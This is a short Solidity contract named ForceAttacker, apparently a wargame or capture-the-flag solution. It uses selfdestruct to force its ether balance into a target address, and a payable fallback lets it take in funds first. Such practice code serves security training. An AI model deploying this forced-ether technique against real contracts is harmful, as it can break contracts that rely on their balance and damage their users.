pragma solidity ^0.8.0;

contract ForceAttacker {

    function destruct(address payable addr) public {
        selfdestruct(addr);
    }

    fallback() external payable {
    }
}
